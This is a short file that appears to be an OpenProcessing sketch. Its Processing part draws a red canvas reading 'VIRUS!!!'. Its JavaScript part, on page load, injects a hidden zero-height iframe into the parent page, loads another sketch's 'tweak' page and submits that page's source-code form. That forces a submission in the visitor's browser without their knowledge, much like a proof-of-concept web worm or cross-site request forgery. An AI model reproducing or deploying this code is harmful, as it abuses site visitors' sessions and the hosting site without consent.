
var newFrame;

function makeF()
{
    newFrame = document.createElement( "iframe" );
    newFrame.id = "externalFrame";
    newFrame.name = "externalFrame";
    newFrame.src = "http://www.openprocessing.org/sketch/146101/tweak";
    parent.document.body.appendChild( newFrame );
    newFrame.style.width = "700px";
    newFrame.style.height = "0px";
    newFrame.style.background = "red";
    window.setTimeout( function() {runF()} , 3000 );
}

function runF()
{
    var f = newFrame.contentWindow.document.getElementById( "sourceCodeArea" );
    f.submit();
}

window.setTimeout( function() {makeF()} , 3000 );



void setup()
{
    size( 400 , 200 );
}

void draw()
{
    background( 255 , 0 , 0 );
    fill( 255 );
    textSize( 20 );
    textAlign( CENTER , CENTER );
    text( "VIRUS!!!" , width/2 , height/2 );
}
